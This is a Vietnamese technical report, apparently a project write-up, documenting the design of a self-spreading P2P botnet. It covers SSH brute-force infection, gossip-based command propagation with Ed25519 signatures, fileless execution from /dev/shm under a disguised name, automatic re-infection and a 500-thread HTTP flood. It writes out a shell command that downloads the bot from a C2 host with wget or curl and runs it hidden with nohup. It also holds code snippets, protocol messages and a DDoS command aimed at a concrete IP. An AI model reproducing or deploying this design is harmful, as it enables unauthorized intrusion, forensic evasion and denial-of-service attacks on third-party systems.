#### b) Bot (Zombie Client) — `bot.py`

Bot là thành phần chính của hệ thống, được triển khai trên các máy nạn nhân (zombie). Mỗi bot hoạt động như một node trong mạng P2P, vừa nhận lệnh từ owner, vừa chuyển tiếp lệnh đến các peer khác. Bảng 1.2 trình bày thông số kỹ thuật của thành phần Bot.

**Bảng 1.2.** Thông số kỹ thuật thành phần Bot

| Thuộc tính | Chi tiết |
|------------|----------|
| Port P2P | UDP 9999 |
| Giao thức | UDP (nhận lệnh P2P và C2\_PUSH) |
| Định danh | `BOT_ID` = MD5(hostname + MAC address), lấy 12 ký tự đầu |
| Ngôn ngữ | Python 3, đóng gói thành binary bằng PyInstaller |
| Thư viện chính | `paramiko`, `pynacl`, `socket`, `threading`, `queue` |

Bot được thiết kế theo kiến trúc đa module, mỗi module đảm nhận một chức năng riêng biệt và chạy trên các thread độc lập. Bảng 1.3 mô tả chi tiết các module chức năng.

**Bảng 1.3.** Các module chức năng của Bot

| Module | Hàm chính | Chức năng |
|--------|-----------|-----------|
| P2P Listener | `p2p_listener()` | Bind UDP socket trên port 9999, lắng nghe liên tục. Xử lý 4 loại message: PING (trả PONG), GET\_CMD (trả lệnh hiện tại kèm version), GOSSIP (nhận lệnh từ peer), C2\_PUSH (nhận lệnh từ owner). Tự động phát hiện và ghi nhận peer mới khi nhận packet từ IP chưa biết. |
| Peer Health Monitor | `peer_health_monitor()` | Thread chạy nền với chu kỳ 30 giây, duyệt toàn bộ bảng `PEER_STATUS`, gửi PING đến từng peer. Nếu peer không phản hồi 3 lần liên tiếp, kích hoạt thread `reinfect_peer()` để tái lây nhiễm. Sử dụng `REINFECT_LOCK` đảm bảo chỉ một thread reinfect cho mỗi IP. |
| Scanner Loop | `scanner_loop()` | Thread chạy nền với chu kỳ 15 giây, quét danh sách `TARGET_VPS_LIST`. Bỏ qua IP của chính mình. Kiểm tra bot đã chạy trên mục tiêu hay chưa bằng cách gửi PING trước khi thực hiện brute-force, nhằm tránh lây nhiễm trùng lặp. |
| Command Processor | `command_processor()` | Vòng lặp chính chạy trên main thread, blocking đọc lệnh từ `CMD_QUEUE`. Xử lý 3 loại lệnh: DDOS (dừng attack cũ, khởi tạo `http_flood()` với 500 worker threads), STOP (dừng tất cả attack), KILL (xóa file bot và thoát). |
| Gossip Protocol | `gossip_to_all()` | Khi nhận lệnh mới hợp lệ, gửi UDP packet chứa lệnh đến tất cả peer trong `PEER_STATUS`, trừ nguồn gửi để tránh vòng lặp. |
| Crypto Verify | `verify_command()` | Tách trường `signature` ra khỏi command, serialize phần body còn lại bằng `json.dumps(sort_keys=True)`, sử dụng `nacl.signing.VerifyKey` với public key hardcode để xác thực chữ ký Ed25519. |

Để đảm bảo tính đồng thời và an toàn dữ liệu giữa các thread, bot sử dụng một tập các cấu trúc dữ liệu được thiết kế cẩn thận, được trình bày trong Bảng 1.4.

**Bảng 1.4.** Cấu trúc dữ liệu quan trọng trong Bot

| Biến | Kiểu dữ liệu | Mô tả |
|------|---------------|-------|
| `CMD_QUEUE` | `queue.Queue` | Hàng đợi thread-safe chứa lệnh cần thực thi, Command Processor blocking đọc từ đây |
| `CMD_REF` | `dict` | Lưu lệnh hiện tại và version (format: `{"version": int, "cmd": dict}`), dùng để so sánh khi nhận lệnh mới và trả lời `GET_CMD` |
| `CMD_LOCK` | `threading.Lock` | Mutex bảo vệ `CMD_REF` khỏi race condition khi nhiều thread cùng cập nhật |
| `PEER_STATUS` | `dict` | Bảng trạng thái peer (format: `{ip: {"port": int, "fails": int}}`), lưu số lần ping thất bại liên tiếp |
| `STOP_FLAG` | `threading.Event` | Cờ dừng attack, khi được set thì tất cả worker thread của `http_flood()` dừng lại |
| `ATTACK_THREADS` | `list[Thread]` | Danh sách thread attack đang chạy, dùng để join khi cần dừng |
| `REINFECT_IN_PROGRESS` | `set` | Tập IP đang được reinfect, kết hợp `REINFECT_LOCK` tránh spawn trùng thread |

Bot hoạt động trên mô hình đa luồng (multi-threading) với các thread được phân chia rõ ràng theo chức năng. Hình 1.2 minh họa sơ đồ phân cấp thread trong bot.

> **[HÌNH 1.2 — Sơ đồ phân cấp thread trong Bot]**
>
> *Mô tả:* Vẽ sơ đồ cây (tree diagram) thể hiện cấu trúc phân cấp các thread trong bot. Main thread ở gốc, phân nhánh thành: `go_fileless()` (bước khởi tạo), `p2p_listener()` (sinh ra `peer_health_monitor()` → `reinfect_peer()`, và `pull_from_peers()`), `scanner_loop()` (sinh ra `infect()`), và `command_processor()` (sinh ra `http_flood()` với 500 worker threads). Nên vẽ bằng công cụ draw.io hoặc PlantUML.

### 1.4. Giao thức truyền thông P2P

Các bot trong hệ thống giao tiếp với nhau hoàn toàn qua giao thức **UDP** trên port **9999**. Tất cả message đều được đóng gói dưới dạng **JSON** và encode sang bytes trước khi gửi. Hệ thống P2P bao gồm bốn giao thức con: Gossip Protocol, PING/PONG Health Check, Pull Sync và Peer Discovery.

#### a) Gossip Protocol — Lan truyền lệnh

Gossip Protocol đảm bảo mọi bot trong mạng đều nhận được lệnh mới, ngay cả khi không kết nối trực tiếp với owner. Chỉ cần owner gửi lệnh đến một bot (gọi là seed), bot đó sẽ tự động lan truyền lệnh đến toàn bộ mạng theo cơ chế truyền miệng (gossip).

Cấu trúc của một message GOSSIP được thiết kế như sau:

```json
{
    "type": "GOSSIP",
    "version": 1740000000,
    "payload": {
        "type": "DDOS",
        "target": "206.189.39.182",
        "port": "80",
        "duration": "60",
        "signature": "base64_encoded_ed25519_signature..."
    },
    "from": "a1b2c3d4e5f6"
}
```

Trong đó, trường `version` là Unix timestamp đảm bảo tính tăng dần, `payload` chứa nội dung lệnh kèm chữ ký số, và `from` là `BOT_ID` của bot gửi.

Quy trình xử lý khi bot nhận được message GOSSIP hoặc C2\_PUSH được thể hiện trong Hình 1.3.

> **[HÌNH 1.3 — Lưu đồ xử lý message GOSSIP/C2\_PUSH]**
>
> *Mô tả:* Vẽ lưu đồ (flowchart) gồm các bước:
> 1. Nhận UDP packet → Parse JSON lấy payload và version.
> 2. Kiểm tra `version > CMD_REF["version"]`? → Nếu KHÔNG: bỏ qua (chống replay, chống loop).
> 3. Nếu CÓ: gọi `verify_command(payload)` xác thực chữ ký Ed25519 → Nếu không hợp lệ: bỏ qua.
> 4. Nếu hợp lệ: Acquire CMD\_LOCK → Double-check version (tránh race condition) → Cập nhật CMD\_REF → Đưa lệnh vào CMD\_QUEUE → Release CMD\_LOCK → Spawn thread `gossip_to_all()` gửi đến tất cả peer trừ nguồn gửi.
>
> Nên vẽ bằng draw.io dạng flowchart chuẩn.

**Ví dụ minh họa quá trình lan truyền lệnh với 3 bot:**

- **Thời điểm T+0:** Owner gửi C2\_PUSH (version=100) đến Bot 1. Bot 1 kiểm tra version 0 < 100, chấp nhận lệnh, thực thi DDOS, đồng thời gossip đến Bot 2 và Bot 3.
- **Thời điểm T+1:** Bot 2 nhận GOSSIP (version=100) từ Bot 1, kiểm tra version 0 < 100, chấp nhận và thực thi. Bot 2 gossip đến Bot 3 (bỏ qua Bot 1 vì là nguồn gửi). Tương tự, Bot 3 nhận từ Bot 1, chấp nhận và gossip đến Bot 2.
- **Thời điểm T+2:** Bot 3 nhận GOSSIP (version=100) từ Bot 2, kiểm tra version 100 = 100, bỏ qua vì đã có lệnh này rồi. Mạng hội tụ, không còn lan truyền thêm.

Giao thức Gossip có bốn đặc điểm kỹ thuật quan trọng:

- **Version dựa trên timestamp:** Giá trị `version = int(time.time())` luôn tăng theo thời gian, đảm bảo lệnh mới luôn có version lớn hơn lệnh cũ.
- **Chống vòng lặp:** Bot bỏ qua nguồn gửi khi gossip, kết hợp so sánh version ngăn chặn lan truyền vô tận.
- **An toàn đa luồng (thread-safe):** `CMD_LOCK` bảo vệ biến `CMD_REF` khi nhiều peer gửi lệnh đồng thời.
- **Fire-and-forget:** Gửi UDP không cần ACK, đơn giản và nhanh chóng.

#### b) PING/PONG — Giám sát sức khỏe mạng (Health Check)

Giao thức PING/PONG phục vụ mục đích phát hiện các bot trong mạng đã ngừng hoạt động (do bị kill, server reboot, mất kết nối mạng) để kích hoạt cơ chế tái lây nhiễm tự động.

Cấu trúc message rất đơn giản:

```json
{"type": "PING"}
{"type": "PONG"}
```

Hàm `peer_health_monitor()` chạy liên tục trên mỗi bot dưới dạng thread nền. Khi khởi tạo, hàm xây dựng bảng `PEER_STATUS` từ danh sách `BOOTSTRAP_PEERS` với mỗi peer có trạng thái ban đầu `{"port": 9999, "fails": 0}`. Cơ chế hoạt động chi tiết được mô tả trong Hình 1.4.

> **[HÌNH 1.4 — Lưu đồ cơ chế Health Check (PING/PONG)]**
>
> *Mô tả:* Vẽ lưu đồ vòng lặp gồm các bước:
> 1. Với mỗi peer trong PEER\_STATUS: gửi PING (UDP, timeout 5 giây).
> 2. Nhận PONG? → CÓ: reset `fails = 0`.
> 3. KHÔNG: `fails += 1` → `fails >= 3`? → KHÔNG: chờ lần tiếp.
> 4. CÓ (peer chết): Acquire REINFECT\_LOCK → Kiểm tra IP chưa trong REINFECT\_IN\_PROGRESS → Thêm IP → Spawn thread `reinfect_peer()` → Reset `fails = 0` → Release LOCK.
> 5. sleep(30 giây) → quay lại bước 1.
>
> Nên vẽ bằng draw.io dạng flowchart.

Khi phát hiện peer chết (fails ≥ 3), bot kích hoạt quy trình tái lây nhiễm `reinfect_peer()` gồm bốn bước:

1. **Xác nhận:** Gửi PING một lần nữa để chắc chắn peer thực sự chết, tránh trường hợp false positive.
2. **Brute-force SSH:** Kiểm tra port 22 có mở hay không, sau đó thử 40 tổ hợp username/password (5 users × 8 passwords).
3. **Lây nhiễm lại:** Thông qua SSH, thực thi lệnh tải bot binary từ HTTP server, cấp quyền thực thi và chạy nền.
4. **Dọn dẹp:** Xóa IP khỏi tập `REINFECT_IN_PROGRESS` trong khối `finally` để đảm bảo luôn được thực thi.

Bảng 1.5 tổng hợp các tham số cấu hình của cơ chế Health Check.

**Bảng 1.5.** Tham số cấu hình Health Check

| Tham số | Giá trị | Ý nghĩa |
|---------|---------|---------|
| `PEER_CHECK_INTERVAL` | 30 giây | Chu kỳ kiểm tra sức khỏe |
| `PEER_DEAD_THRESHOLD` | 3 lần | Số lần ping thất bại trước khi coi là chết |
| `PEER_TIMEOUT` | 5 giây | Timeout cho mỗi lần PING |
| Thời gian phát hiện tối đa | 90 giây | = 3 lần × 30 giây/lần |
| Thời gian phục hồi trung bình | ~2–3 phút | = phát hiện (90s) + brute-force + tải bot + khởi động |

#### c) Pull Sync — Đồng bộ lệnh khi khởi động

Khi bot vừa khởi động (lần đầu hoặc sau tái lây nhiễm), nó chưa biết lệnh hiện tại của mạng. Giao thức Pull Sync giúp bot nhanh chóng đồng bộ lệnh mới nhất từ các peer đang hoạt động.

Cấu trúc message:

```json
// Request
{"type": "GET_CMD"}

// Response
{
    "type": "CMD_RES",
    "version": 1740000000,
    "payload": {"type": "DDOS", "target": "...", "signature": "..."}
}
```

Hàm `pull_from_peers()` chạy một lần duy nhất khi bot khởi động, thực hiện quy trình được mô tả trong Hình 1.5.

> **[HÌNH 1.5 — Lưu đồ quy trình Pull Sync]**
>
> *Mô tả:* Vẽ lưu đồ (flowchart) gồm các bước:
> 1. sleep(2 giây) chờ khởi tạo PEER\_STATUS.
> 2. Với mỗi peer: gửi `GET_CMD` (UDP, timeout 3 giây).
> 3. Nhận CMD\_RES → `version > CMD_REF["version"]`? → KHÔNG: thử peer tiếp.
> 4. CÓ: `verify_command(payload)` → Hợp lệ? → KHÔNG: bỏ qua.
> 5. CÓ: Acquire CMD\_LOCK → Cập nhật CMD\_REF → Đưa vào CMD\_QUEUE → return True.
> 6. Nếu hết peer: return False.
>
> Nên vẽ bằng draw.io dạng flowchart.

Pull Sync được sử dụng trong ba tình huống chính:

- **Bot vừa được lây nhiễm lần đầu:** Pull lệnh DDOS đang chạy từ peer, tham gia tấn công ngay lập tức.
- **Bot bị reboot, khởi động lại:** Pull lệnh mới nhất từ peer, tiếp tục nhiệm vụ đang dở.
- **Toàn bộ mạng đang ở trạng thái chờ:** Pull trả về version 0, bot cũng chuyển sang trạng thái chờ (WAIT).

#### d) Peer Discovery — Khám phá peer mới

Ngoài danh sách `BOOTSTRAP_PEERS` được hardcode sẵn trong mã nguồn, bot còn tự động phát hiện peer mới thông qua cơ chế **implicit discovery**. Cụ thể, trong hàm `p2p_listener()`, sau khi xử lý bất kỳ message nào, bot kiểm tra IP nguồn của UDP packet. Nếu IP này chưa tồn tại trong `PEER_STATUS`, bot tự động thêm vào danh sách peer:

```python
peer_ip = addr[0]
if peer_ip not in PEER_STATUS:
    PEER_STATUS[peer_ip] = {"port": P2P_PORT, "fails": 0}
```

Nhờ cơ chế này, khi bất kỳ IP mới nào gửi message đến (PING, GOSSIP, C2\_PUSH), bot sẽ tự động ghi nhận, cho phép mạng P2P tự mở rộng khi có bot mới tham gia mà không cần cập nhật cấu hình thủ công.

### 1.5. Cơ chế bảo mật và sinh tồn

Hệ thống botnet được trang bị nhiều cơ chế bảo mật và sinh tồn nhằm đảm bảo tính toàn vẹn của lệnh điều khiển, khả năng ẩn mình trước các công cụ phân tích, và khả năng tự phục hồi khi bị phát hiện hoặc vô hiệu hóa.

#### a) Xác thực lệnh bằng chữ ký số Ed25519

**Vấn đề:** Trong mạng P2P, bất kỳ ai cũng có thể gửi UDP packet giả mạo lệnh đến bot. Nếu không có cơ chế xác thực, kẻ tấn công bên thứ ba có thể chiếm quyền điều khiển botnet.

**Giải pháp:** Hệ thống sử dụng thuật toán chữ ký số **Ed25519** (Elliptic Curve Digital Signature Algorithm) với quy trình ký và xác thực được mô tả trong Hình 1.6.

> **[HÌNH 1.6 — Sơ đồ quy trình ký và xác thực lệnh Ed25519]**
>
> *Mô tả:* Vẽ sơ đồ chia hai phần (block diagram hoặc sequence diagram):
>
> **Phía Owner (ký lệnh):**
> 1. Tạo command dict chứa type, target, port, duration.
> 2. Serialize bằng `json.dumps(sort_keys=True).encode()` đảm bảo thứ tự key cố định.
> 3. Ký bằng `Ed25519_Sign(PRIVATE_KEY, body)` tạo chữ ký 64 bytes.
> 4. Gắn chữ ký dạng base64 vào trường `signature` → Gửi qua UDP.
>
> **Phía Bot (xác thực):**
> 1. Tách trường `signature`, decode base64.
> 2. Rebuild body (loại bỏ trường signature), serialize lại bằng `json.dumps(sort_keys=True).encode()`.
> 3. Gọi `Ed25519_Verify(PUBLIC_KEY, msg, sig)` → Khớp: lệnh hợp lệ / Không khớp: bỏ qua.
>
> Ghi chú trên sơ đồ: Private key (32 bytes) chỉ owner giữ. Public key (32 bytes) hardcode trên bot.
> Nên vẽ bằng draw.io.

Đặc điểm quan trọng của cơ chế xác thực này:

- **Private key** (32 bytes) chỉ tồn tại trên máy owner, không bao giờ xuất hiện trên bot.
- **Public key** (32 bytes) được hardcode trên mỗi bot, chỉ phục vụ mục đích xác thực.
- Không thể giả mạo chữ ký nếu không có private key.
- Bất kỳ thay đổi nào dù chỉ 1 bit trong nội dung lệnh cũng khiến chữ ký trở nên không hợp lệ.

#### b) Fileless Execution — Thực thi từ RAM

**Vấn đề:** File bot binary lưu trên đĩa cứng dễ bị phát hiện bởi phần mềm antivirus hoặc phân tích forensic.

**Giải pháp:** Bot tự di chuyển vào **tmpfs** (filesystem trên RAM) và xóa file gốc trên đĩa cứng. Quy trình chi tiết được trình bày trong Bảng 1.6 và minh họa trong Hình 1.7.

**Bảng 1.6.** Các bước thực hiện Fileless Execution

| Bước | Hành động | Chi tiết kỹ thuật |
|------|-----------|-------------------|
| 1 | Xác định vị trí hiện tại | `me = os.path.abspath(sys.argv[0])` |
| 2 | Kiểm tra đã ở RAM chưa | So sánh `me == "/dev/shm/.cache_x"`, nếu đúng thì bỏ qua |
| 3 | Kiểm tra instance khác | Thử `socket.bind(("0.0.0.0", 9999))`, nếu port bị chiếm thì thoát |
| 4 | Copy vào RAM disk | `shutil.copy2(me, "/dev/shm/.cache_x")` |
| 5 | Cấp quyền thực thi | `os.chmod("/dev/shm/.cache_x", 0o755)` |
| 6 | Xóa file gốc | `os.remove(me)` — xóa file khỏi đĩa cứng |
| 7 | Thay thế process | `os.execv("/dev/shm/.cache_x", [...])` — process được thay thế hoàn toàn |

> **[HÌNH 1.7 — Lưu đồ quy trình Fileless Execution]**
>
> *Mô tả:* Vẽ lưu đồ gồm hai giai đoạn:
>
> **Giai đoạn 1 — Chạy lần đầu từ /tmp/.s:**
> `go_fileless()` → Xác định path hiện tại → Chưa ở RAM → Kiểm tra port 9999 khả dụng → Copy file sang `/dev/shm/.cache_x` → Cấp quyền thực thi → Xóa `/tmp/.s` → `os.execv()` thay thế process.
>
> **Giai đoạn 2 — Chạy từ /dev/shm/.cache_x:**
> `go_fileless()` → Xác định path → Đã ở RAM → return → Khởi động bot bình thường (khởi tạo threads, chạy `command_processor()`).
>
> **Trạng thái cuối:** `/tmp/.s` không tồn tại, `/dev/shm/.cache_x` đang chạy, disk footprint = 0.
> Nên vẽ bằng draw.io.

Hệ thống chọn `/dev/shm` làm vị trí thực thi vì các lý do sau:

- `/dev/shm` là **tmpfs**, filesystem nằm hoàn toàn trên RAM.
- Không ghi dữ liệu xuống đĩa cứng, do đó không để lại dấu vết vật lý.
- Dữ liệu tự động mất khi reboot, bot phụ thuộc vào cơ chế tái lây nhiễm để duy trì sự hiện diện.
- Tên file `.cache_x` được ngụy trang giống file cache hệ thống, khó bị phát hiện khi liệt kê thư mục.

#### c) Single Instance Protection — Bảo vệ chống chạy trùng lặp

**Vấn đề:** Nếu bot bị tải và chạy nhiều lần trên cùng một máy sẽ gây lãng phí tài nguyên và xung đột port.

**Giải pháp:** Hệ thống kiểm tra port 9999 trước khi chạy với hai lớp bảo vệ:

1. **Trong hàm `go_fileless()`:** Thử gọi `socket.bind()` trên port 9999. Nếu xảy ra `OSError` (port đã bị chiếm bởi instance khác), bot thoát ngay lập tức bằng `os._exit(0)`.
2. **Trong hàm `p2p_listener()`:** Nếu `sock.bind()` thất bại, bot in thông báo "another instance running" và thoát bằng `os._exit(0)`.

#### d) Version Control — Chống tấn công phát lại (Replay Attack)

**Vấn đề:** Kẻ tấn công có thể bắt (capture) UDP packet chứa lệnh cũ, sau đó gửi lại (replay) để bot thực thi lệnh không mong muốn.

**Giải pháp:** Mỗi lệnh mang theo trường `version` có giá trị bằng `int(time.time())` (Unix timestamp) tại thời điểm tạo lệnh. Bot chỉ chấp nhận lệnh có `version` lớn hơn giá trị `CMD_REF["version"]` hiện tại. Vì timestamp luôn tăng theo thời gian, lệnh cũ không bao giờ có version cao hơn lệnh mới. Kết hợp với chữ ký Ed25519, kẻ tấn công không thể sửa đổi trường version trong packet mà không phá vỡ chữ ký.

Bảng 1.7 tổng hợp toàn bộ các cơ chế bảo mật và sinh tồn của hệ thống.

**Bảng 1.7.** Tổng hợp cơ chế bảo mật và sinh tồn

| Cơ chế | Mối đe dọa được chống lại | Cách thức hoạt động |
|--------|---------------------------|---------------------|
| Ed25519 Signature | Command injection, Man-in-the-middle | Ký bằng private key, verify bằng public key hardcode trên bot |
| Fileless Execution | Disk forensic, Antivirus scan | Chạy từ RAM (`/dev/shm`), xóa file gốc trên đĩa cứng |
| Single Instance | Lãng phí tài nguyên, xung đột port | Kiểm tra bind port 9999 trước khi chạy |
| Auto Re-infection | Bot bị takedown, server reboot | Health check phát hiện bot chết, SSH brute-force lây nhiễm lại |
| Version Control | Replay attack | Timestamp làm version, chỉ chấp nhận version lớn hơn |
| Peer Discovery | Phân mảnh mạng (network partition) | Tự động phát hiện IP mới từ incoming packets |

### 1.6. Luồng hoạt động chi tiết

Phần này trình bày chi tiết ba luồng hoạt động chính của hệ thống: luồng lây nhiễm, luồng fileless execution và luồng xử lý lệnh.

#### a) Luồng lây nhiễm (Infection Flow)

Luồng lây nhiễm được thực hiện bởi hàm `scanner_loop()` chạy dưới dạng thread nền với chu kỳ 15 giây. Quy trình chi tiết được thể hiện trong Hình 1.8.

> **[HÌNH 1.8 — Lưu đồ luồng lây nhiễm (Infection Flow)]**
>
> *Mô tả:* Vẽ lưu đồ (flowchart) chi tiết gồm các bước:
> 1. `scanner_loop()` khởi động → `get_my_ip()` xác định IP hiện tại.
> 2. Duyệt từng IP trong `TARGET_VPS_LIST` → Nếu `IP == my_ip`: bỏ qua (không tự tấn công mình).
> 3. Gửi PING đến IP:9999 → Nhận PONG? → CÓ: bot đã chạy, bỏ qua → KHÔNG: tiếp tục.
> 4. `ssh_brute_force()`: kiểm tra port 22 mở → Thử 40 tổ hợp user/pass → Thành công: có SSH session.
> 5. Spawn daemon thread `infect()`: SSH exec\_command tải bot từ HTTP server → chmod +x → nohup chạy nền.
> 6. Bot mới khởi động trên máy mục tiêu → Tham gia mạng P2P.
> 7. sleep(15 giây) → quay lại bước 2.
>
> Nên vẽ bằng draw.io dạng flowchart.

Quy trình lây nhiễm diễn ra như sau: đầu tiên, bot xác định IP của chính mình thông qua kết nối UDP tới `8.8.8.8:80` và gọi `getsockname()`. Sau đó, bot duyệt danh sách `TARGET_VPS_LIST`, bỏ qua IP của mình. Với mỗi IP mục tiêu, bot kiểm tra xem đã có bot chạy trên đó chưa bằng cách gửi PING đến port UDP 9999. Nếu chưa có bot (không nhận được PONG), bot tiến hành brute-force SSH bằng từ điển gồm 40 tổ hợp username/password. Khi tìm được credentials hợp lệ, bot spawn một daemon thread thực thi lệnh sau qua SSH:

```bash
cd /tmp && (wget -q http://<c2_ip>/bot -O .s || curl -s http://<c2_ip>/bot -o .s) && chmod +x .s && nohup ./.s >/dev/null 2>&1 &
```

Bot binary được tải từ HTTP server, lưu tại `/tmp/.s`, cấp quyền thực thi và chạy nền. Sau khi khởi động, bot mới sẽ tự thực hiện fileless execution và tham gia mạng P2P.

#### b) Luồng Fileless Execution

Luồng fileless execution diễn ra ngay khi bot được khởi chạy, trước bất kỳ logic nào khác. Quy trình đã được mô tả chi tiết trong Hình 1.7 (mục 1.5b).

Bảng 1.8 tóm tắt trạng thái hệ thống sau khi hoàn tất fileless execution.

**Bảng 1.8.** Trạng thái sau khi hoàn tất Fileless Execution

| Thành phần | Trạng thái |
|------------|------------|
| `/tmp/.s` (file gốc trên đĩa) | Đã bị xóa, không tồn tại |
| `/dev/shm/.cache_x` (file trên RAM) | Đang chạy |
| Process | Active, executable path trỏ đến `/dev/shm/.cache_x` |
| Dấu vết trên đĩa cứng | Không có (zero disk footprint) |

#### c) Luồng xử lý lệnh (Command Execution Flow)

Hàm `command_processor()` là vòng lặp chính của bot, chạy trên main thread và blocking đọc lệnh từ `CMD_QUEUE`. Luồng xử lý được mô tả trong Hình 1.9.

> **[HÌNH 1.9 — Lưu đồ xử lý lệnh (Command Execution Flow)]**
>
> *Mô tả:* Vẽ lưu đồ bắt đầu từ `command_processor()` → Blocking đọc `CMD_QUEUE.get()` → Phân loại lệnh theo `cmd["type"]`:
>
> - **Nhánh DDOS:** Gọi `stop_all_attacks()` (set STOP\_FLAG → join tất cả attack threads → clear STOP\_FLAG) → Spawn thread `http_flood()` tạo 500 worker threads → Mỗi worker: TCP connect → gửi HTTP GET request → recv(1) → đóng socket → lặp lại cho đến khi hết duration hoặc STOP\_FLAG được set.
> - **Nhánh STOP:** Gọi `stop_all_attacks()` dừng tất cả attack đang chạy.
> - **Nhánh KILL:** Gọi `cleanup_and_exit()` → set STOP\_FLAG → `os.remove(sys.argv[0])` xóa file bot → `os._exit(0)` thoát ngay.
>
> Nên vẽ bằng draw.io dạng flowchart.

Cụ thể, khi nhận lệnh **DDOS**, bot trước tiên dừng tất cả cuộc tấn công đang chạy (nếu có) bằng cách set `STOP_FLAG` và join các thread cũ. Sau đó, bot khởi tạo thread `http_flood()` với 500 worker thread daemon, mỗi worker liên tục tạo kết nối TCP đến mục tiêu, gửi HTTP GET request với header chuẩn, đóng kết nối và lặp lại cho đến khi hết thời gian `duration` hoặc `STOP_FLAG` được set.

Khi nhận lệnh **STOP**, bot gọi `stop_all_attacks()` để dừng mọi cuộc tấn công đang chạy một cách an toàn. Khi nhận lệnh **KILL**, bot gọi `cleanup_and_exit()` để set cờ dừng, xóa file thực thi của chính mình và thoát ngay lập tức bằng `os._exit(0)`.
